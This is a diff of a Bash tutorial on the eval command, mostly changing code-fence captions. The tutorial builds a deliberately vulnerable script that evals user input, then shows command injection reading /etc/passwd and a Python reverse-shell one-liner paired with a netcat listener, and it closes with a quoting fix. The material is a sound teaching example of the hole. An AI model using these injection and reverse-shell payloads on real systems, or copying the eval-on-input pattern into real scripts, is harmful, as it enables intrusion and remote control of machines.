@@ -42,13 +42,13 @@ Take a look at a few `eval` examples to help you understand what's going on when
 
 To explore a basic `eval` example, run the following command in your terminal window:
 
-~~~
+~~~{.bash caption=">_"}
 $ eval "echo Hello $USER!"
 ~~~
 
 This will output the following:
 
-~~~
+~~~{ caption="Output"}
 Hello thinus!
 ~~~
 
@@ -66,26 +66,26 @@ In this example, the following occurs:
 
 Because the `eval` statement evaluates and detects commands and other variables from the string, you can end up with the same `eval` commands having different values. For example, you might want to know what the day was exactly a week ago:
 
-~~~
+~~~{.bash caption=">_"}
 $ lastweek='date --date="1 week ago"'
 $ eval $lastweek
 ~~~
 
 This will output the following:
 
-~~~
+~~~{ caption="Output"}
 Thu 04 May 2023 23:15:38 SAST
 ~~~
 
 Run the same command a few minutes later, and the time value of `$lastweek` increases by a bit more than a minute:
 
-~~~
+~~~{.bash caption=">_"}
 $ eval $lastweek
 ~~~
 
 This will output the following:
 
-~~~
+~~~{ caption="Output"}
 Thu 04 May 2023 23:17:50 SAST
 ~~~
 
@@ -105,7 +105,7 @@ Command injection is a security vulnerability where an attacker can execute unau
 
 Consider the following Bash script that asks a user for their name, reads their input, and prints the name out. You can save your own copy on your system as `hello.sh`:
 
-~~~
+~~~{.bash caption=">_"}
 #!/bin/bash
 
 # Ask the user for their name
@@ -121,14 +121,14 @@ eval "$(echo "${output[@]}")"
 
 You might have to give the script execute permissions, and if you follow along with this example, it should work:
 
-~~~
+~~~{.bash caption=">_"}
 $ chmod +x hello.sh
 $ ./hello.sh
 ~~~
 
 This will output the following:
 
-~~~
+~~~{ caption="Output"}
 Hello, who is this?
 LocalUser
 Welcome user: LocalUser
@@ -136,13 +136,13 @@ Welcome user: LocalUser
 
 While this example isn't particularly useful, it shows you how reading user input can be dangerous. Run the script again, but this time, change the input you're giving to the script to `LocalUser;date`:
 
-~~~
+~~~{.bash caption=">_"}
 $ ./hello.sh 
 ~~~
 
 This will output the following:
 
-~~~
+~~~{ caption="Output"}
 Hello, who is this?
 LocalUser;date
 Welcome user: LocalUser
@@ -151,13 +151,13 @@ Sat 13 May 2023 00:54:16 SAST
 
 As you can see, your welcome script allowed an attacker to read the date on your system! While this might sound harmless, a savvy attacker can use your script to gather information:
 
-~~~
+~~~{.bash caption=">_"}
 $ ./hello.sh 
 ~~~
 
 This will output the following:
 
-~~~
+~~~{ caption="Output"}
 Hello, who is this?
 LocalUser;cat /etc/passwd
 Welcome user: LocalUser
@@ -176,29 +176,32 @@ To achieve this, an attacker can use your vulnerable script to create a [reverse
 
 First, the attacker sets up a listening port on their attack box using `[netcat](https://nmap.org/ncat/)`:
 
-~~~
+~~~{.bash caption=">_"}
 $ nc -lvp 4444
 ~~~
 
 This will output the following:
 
-~~~
+~~~{ caption="Output"}
 Listening on 0.0.0.0 4444
 ~~~
 
 Then they use the `eval` in your `hello.sh` script to connect to their listening port, effectively giving themselves a shell on your vulnerable system:
 
-~~~
+~~~{.bash caption=">_"}
 user@localhost:$ ./hello.sh
 Hello, who is this?
-LocalUser;export RHOST="localhost";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+LocalUser;export RHOST="localhost";export RPORT=4444;python3 -c \
+'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),\
+int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];\
+pty.spawn("/bin/sh")'
 Welcome user: User
 
 ~~~
 
 Now, from the attacker's box, you can execute normal shell commands directly on the victim's box:
 
-~~~
+~~~{.bash caption=">_"}
 Connection received on localhost 47004
 $ ls
 ls
@@ -241,10 +244,11 @@ One of the easiest ways to sanitize user input is to make sure that all the diff
 
 You can write a quote function that your script can use to make sure all the parts of the input have quotes. For instance, modify our `hello.sh` script accordingly:
 
-~~~
+~~~{.bash caption=">_"}
 #!/bin/bash
 
-# create a token quote function to clean up user inputs and make sure they have quotes
+# create a token quote function to clean up user 
+# inputs and make sure they have quotes
 function token_quotes {
   local quoted=()
   for token; do
@@ -267,13 +271,13 @@ eval "$(token_quotes "${output[@]}")"
 
 Now, try to hack yourself again:
 
-~~~
+~~~{.bash caption=">_"}
 $ ./hello.sh 
 ~~~
 
 Output:
 
-~~~
+~~~{ caption="Output"}
 Hello, who is this?
 LocalUser;date
 Welcome user: LocalUser;date
